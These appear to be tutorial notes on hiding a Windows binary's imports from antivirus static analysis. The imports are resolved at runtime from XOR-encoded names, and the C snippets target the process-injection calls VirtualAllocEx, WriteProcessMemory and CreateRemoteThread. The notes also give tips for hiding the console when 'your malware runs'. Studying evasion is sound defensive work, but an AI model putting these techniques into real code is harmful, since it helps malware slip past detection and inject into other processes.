
### Function Call Obfuscation

Function call obfuscation is a method of hiding your DLLs and external functions that will be called during runtime.  

Every PE module (exe, dll, etc) usually uses external functions. When it is running it call functions in an external DLL which are mapped into process memory in order to make them available to the process.  

One of the ways AV detects malicious PE files is by analysing which external DLLs and functions are used by the binary. This is done without ever actually running the binary.  

It analyses the PE file on disk by looking into its import address table and compares the functions the binary wants to call at runtime against a known list of suspicious functions. This method leads to false-positives however is widely used. It is however not bulletproof.  

What can we do about it?  

We can use standard windows API functions called GetModuleHandle and GetProcAddress.  
`GetModuleHandle` returns a handle to a specified DLL  
`GetProcAddress` allows you to obtain the memory address of the function you need which is exported from the DLL  

We will need to xor the string that contains the name of the functon we want to call still as this will be present in the binary - best key to use is an existing string retrived from binary, this lessens the chance of detection.  

This hides the function during static analysis, this is because at compilation time, the compiler will not include the dll in the import address table.  

#### hiding the black-console-popup when your malware runs.  
1. FreeConsole() - this will still produce avery slight and subtle popup however, not perfect however easy to implement  
2. Create a WinMain rather that main function, this allows us to tell out compiler to compile source as a GUI program rather that console  


#### Obfuscation technicals
lets say we want to obfuscate VirtualAllocEx to defeat static analysism we would go to the MSDN page, copy the syntax into our code (depending on what you are calling make sure it is implemented in kernel32.dll) and define a pointer to it
```
//obtain the syntax for calls we want to obfuscate via ms documentation and create pointers to them, these will be called in our inject function
LPVOID (WINAPI * pVirtualAllocEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId
);
```

```
//in our inject function, declare variables to be used in XOR decrypt function, values are output of printCiphertext(xor("VirtualAllocEx", "mysecretkeee")) etc
		unsigned char sVirtualAllocEx [] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
		unsigned char sWriteProcessMemory [] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
		unsigned char sCreateRemoteThread [] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
		//decrypt our declared strings as above
		XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
		XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
		XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
		//resolve the addresses
		pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
		pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
		pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateRemoteThread);
```
